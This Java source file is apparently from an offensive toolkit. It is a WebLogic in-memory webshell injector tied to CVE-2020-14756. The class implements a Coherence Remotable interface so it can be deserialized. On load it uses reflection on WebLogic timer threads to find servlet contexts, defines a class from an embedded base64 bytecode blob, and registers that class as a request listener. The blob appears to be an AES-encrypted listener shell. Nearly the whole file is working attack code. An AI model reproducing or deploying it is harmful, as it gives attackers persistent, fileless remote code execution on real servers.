package core.memshell;

import com.tangosol.internal.util.invoke.RemoteConstructor;
import sun.misc.BASE64Decoder;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;

public class WeblogicListenerMemShell_CVE_2020_14756 implements com.tangosol.internal.util.invoke.Remotable {

    private static String shellClassName = "com.sui.ldap.utils.WeblogicListenerShell";

    public WeblogicListenerMemShell_CVE_2020_14756() {
        injectM();
    }

    public static synchronized void injectM() {
        List var0 = getContext();
        Iterator var1 = var0.iterator();

        while(var1.hasNext()) {
            Object var2 = var1.next();
            if (isInject(var2)){break;}
            registerListener(var2);
        }
    }
    private static synchronized boolean isInject(Object obj){
        boolean flag = false;
        try{
            Field var6 = obj.getClass().getDeclaredField("eventsManager");
            var6.setAccessible(true);
            Object var7 = var6.get(obj);
            Method var3 = var7.getClass().getDeclaredMethod("isListenerRegistered", String.class);
            var3.setAccessible(true);
            flag = ((Boolean)var3.invoke(var7, shellClassName)).booleanValue();
        }catch(Exception e){
            e.printStackTrace();
        }
        return flag;
    }


    public static synchronized List<Object> getContext() {
        ArrayList var0 = new ArrayList();

        try {
            Method var1 = Thread.class.getDeclaredMethod("getThreads", (Class[])null);
            var1.setAccessible(true);
            Thread[] var2 = (Thread[])((Thread[])var1.invoke((Object)null));
            Thread[] var3 = var2;
            int var4 = var2.length;

            for(int var5 = 0; var5 < var4; ++var5) {
                Thread var6 = var3[var5];
                if (var6.getClass().getName().contains("weblogic.timers.internal.TimerThread")) {
                    try {
                        Object var7 = getFV(var6, "timerThread");

                        Object var12;
                        Object var13;
                        Object var15;
                        Object var17;
                        try {
                            Object var8 = getFV(var7, "timerTree");
                            Map var21 = (Map)var8;
                            Iterator var22 = var21.entrySet().iterator();

                            while(var22.hasNext()) {
                                Map.Entry var23 = (Map.Entry)var22.next();
                                var12 = var23.getValue();
                                var13 = getFV(var12, "listener");
                                if (var13.getClass().getName().contains("SessionContext")) {
                                    Field var24 = var13.getClass().getDeclaredField("this$0");
                                    var24.setAccessible(true);
                                    var15 = var24.get(var13);
                                    Field var25 = var15.getClass().getSuperclass().getDeclaredField("servletContext");
                                    var25.setAccessible(true);
                                    var17 = var25.get(var15);
                                    var0.add(var17);
                                }
                            }
                        } catch (Exception var18) {
                            Object var9 = getFV(var7, "managerList");
                            List var10 = (List)var9;
                            Iterator var11 = var10.iterator();

                            while(var11.hasNext()) {
                                var12 = var11.next();
                                if (var12.toString().contains("AsyncContextTimer-ContextPath=")) {
                                    var13 = getFV(var12, "timerSet");
                                    Object var14 = getFV(var13, "timers");
                                    var15 = ((List)var14).get(0);
                                    Object var16 = getFV(var15, "listener");
                                    var17 = getFV(var16, "context");
                                    var0.add(var17);
                                }
                            }
                        }
                    } catch (Exception var19) {
                    }
                }
            }
        } catch (Exception var20) {
        }

        return var0;
    }

    public static synchronized void registerListener(Object var0) {
        try {
            byte[] var1 = (new BASE64Decoder()).decodeBuffer("yv66vgAAADMBWQoAYACyCQBGALMJAEYAtAgAtQkARgC2CAC3CQBGALgIALkJAEYAugcAuwoACgCyCgAKALwKAAoAvQoARgC+CQBGAL8IAMAJAEYAwQoAYADCCgBgAMMIAMQKAMUAxgcAxwoAMQDICgAWAMkKAMUAygoAxQDLBwDMCADNCgDOAM8KADEA0AoAzgDRBwDSCgDOANMKACAA1AoAIADVCgAxANYIANcKAC4A2AgA2QcA2goALgDbBwDcCgDdAN4KADAA3wgA4AcA4QcAeQcA4gcA4wgA5AoALgDlCADmCADnCADoCADpCADqCgDrAOwHAO0KAEYA7ggA7wsAOgDwCADxCgAxAPILADoA8wsAOgD0CgBGAPUKAEYA9ggA9wsA+AD5BwD6CgAuAPsKAEYAwgoARgD8CwD4AP0IAP4LADoA/QcA/woATQCyCgAwAQALAF4BAQoAMQECCgEDAQQKADAAvQoATQEFCgBGAQYKADEBBwgBCAgBCQoAGwEKCABkCgAuAQsKAQwBDQoBDAEOBwEPCABiBwEQBwERAQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAAnhjAQASTGphdmEvbGFuZy9TdHJpbmc7AQADUHdkAQAEcGF0aAEAA21kNQEAAmNzAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACBMbWVtc2hlbGwvV2VibG9naWNMaXN0ZW5lclNoZWxsOwEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQABegEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABUQEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAmNiAQACW0IBAAF4AQAHKFtCWilbQgEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAR2YXI0AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQABcwEAAW0BAAFaAQANU3RhY2tNYXBUYWJsZQcA+gcBEgcAzAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAdTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAANyZXQHAOMBAAxiYXNlNjRFbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAHRW5jb2RlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABmJhc2U2NAEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEdmFyNgEAAmJzAQAFdmFsdWUBAApFeGNlcHRpb25zAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBABByZXF1ZXN0RGVzdHJveWVkAQAmKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQ7KVYBAANyZXEBACNMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OwEAEnJlcXVlc3RJbml0aWFsaXplZAEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAEZGF0YQEABHZhcjkHARMHAO0HAQ8HARQBABZnZXRSZXNwb25zZUZyb21SZXF1ZXN0AQBRKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OylMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAEdmFyMwEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAR2YXI1AQAEdmFyOAEABHZhcjEBAAR2YXIyAQAKU291cmNlRmlsZQEAGldlYmxvZ2ljTGlzdGVuZXJTaGVsbC5qYXZhDABsAG0MAGIAYwwAZABlAQAQM2M2ZTBiOGE5YzE1MjI0YQwAZgBnAQAEcEFTMwwAaABnAQAQL2Zhdmljb25kZW1vLmljbwwAaQBnAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMARUBFgwBFwEYDABqAIcMAGoAZwEABVVURi04DABrAGcMAGwAcwwBGQEaAQADQUVTBwESDAEbARwBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDAEdAR4MAGwBHwwBIAEhDAEiASMBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQADTUQ1BwEkDAEbASUMASYBJwwBKAEpAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMASoBHgwAbAErDAEXASwMAS0BGAEAEGphdmEudXRpbC5CYXNlNjQMAS4BLwEACmdldEVuY29kZXIBABJbTGphdmEvbGFuZy9DbGFzczsMATABMQEAE1tMamF2YS9sYW5nL09iamVjdDsHATIMATMBNAwBNQE2AQAOZW5jb2RlVG9TdHJpbmcBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIMATcBOAEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyBwETDAE5AToBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0DACoAKkBABBYLVJlcXVlc3RlZC1XaXRoDAE7AIcBAA5YTUxIVFRQUmVxdWVzdAwBPAE9DAE+AT8MAUAAhwwAlQCWDAB6AHsBABBtZW1zaGVsbC5wYXlsb2FkBwEUDAFBAUIBAB5tZW1zaGVsbC9XZWJsb2dpY0xpc3RlbmVyU2hlbGwMAUMBRAwAdgB3DAFFAUYBAApwYXJhbWV0ZXJzAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0MAUcBSAwBSQFKDAFLAUwHAU0MAU4BTwwBUAEeDACLAIwMAUsBLAEADlhtbEhUVFBSZXF1ZXN0AQAHU3VjY2VzcwwBUQBtDAFSAVMHAVQMAVUBVgwBVwFYAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBACRqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0TGlzdGVuZXIBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEABmxlbmd0aAEAAygpSQEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBABFnZXRTZXJ2bGV0UmVxdWVzdAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAJZ2V0SGVhZGVyAQAHaW5kZXhPZgEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Np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");
            Method var2 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            var2.setAccessible(true);
            Class clazz = (Class)var2.invoke(var0.getClass().getClassLoader(), var1, 0, var1.length);
        } catch (Exception var5) {
        }

        try {
            Field var6 = var0.getClass().getDeclaredField("eventsManager");
            var6.setAccessible(true);
            Object var7 = var6.get(var0);
            Method var3 = var7.getClass().getDeclaredMethod("registerEventListener", String.class);
            var3.setAccessible(true);
            var3.invoke(var7, shellClassName);
            System.out.println();
        } catch (Exception var4) {
        }
    }

    private static synchronized Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while(var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }

    static {
        injectM();
    }

    @Override
    public RemoteConstructor getRemoteConstructor() {
        return null;
    }

    @Override
    public void setRemoteConstructor(RemoteConstructor remoteConstructor) {

    }
}
 